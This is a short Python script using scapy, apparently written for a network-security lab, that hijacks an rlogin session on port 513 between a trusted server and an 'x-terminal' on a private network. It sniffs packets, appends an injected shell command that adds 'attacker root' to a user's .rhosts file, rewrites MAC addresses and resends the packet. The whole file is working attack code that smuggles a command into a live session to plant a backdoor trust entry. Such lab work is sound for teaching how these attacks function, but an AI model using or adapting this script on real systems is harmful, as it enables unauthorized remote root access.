#!/usr/bin/env python3
from scapy.all import *

# Define the command to be executed on the x-terminal
command = "     && echo 'attacker root' >> /home/fontoura/.rhosts"


# Define the function to modify the payload of the packet
def modify_payload(pkt):
    if TCP in pkt and pkt[TCP].dport == 513 and pkt[TCP].payload:
        # Modify the payload of the packet
        pkt[TCP].payload = Raw(pkt[TCP].payload.load + command.encode())
        # Recalculate the TCP checksum
        del pkt[TCP].chksum
        # change the mac address of the dst
        pkt[Ether].src = "02:42:ac:1c:01:03"
        pkt[Ether].dst = "02:42:ac:1c:01:02"
        pkt.show()
        # Send the modified packet
        send(pkt)


# Start sniffing for TCP packets going from the trusted server to the x-terminal
sniff(filter="tcp and dst host 172.28.1.2 and src host 172.28.1.3", prn=modify_payload)
